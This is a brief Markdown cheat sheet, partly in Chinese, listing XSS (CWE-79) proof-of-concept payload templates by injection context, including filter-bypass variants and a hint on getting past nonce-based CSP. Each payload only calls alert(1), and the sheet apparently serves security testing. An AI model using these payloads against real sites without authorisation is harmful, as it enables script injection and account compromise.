# XSS (Cross-Site Scripting, CWE-79)

## PoC 模板

| Context | poc_payload |
|---|---|
| HTML 元素内容 | `<script>alert(1)</script>` / `<img src=x onerror=alert(1)>` |
| HTML 属性双引号内 | `"><svg/onload=alert(1)>` / `" onmouseover="alert(1)` |
| JavaScript 字符串内 | `</script><script>alert(1)</script>` |
| URL 参数 | `javascript:alert(1)` (href / iframe.src) |
| DOM-based XSS | `#</script><script>alert(1)</script>` (URL fragment) |
| Bypass simple filter | `<sCrIpT>alert(1)</script>` / `<scr<script>ipt>alert(1)</script>` |
| Bypass CSP (nonce-based) | 找 nonce 泄露的辅助渠道或 `script-src 'self'` 时上传 JS 文件 |
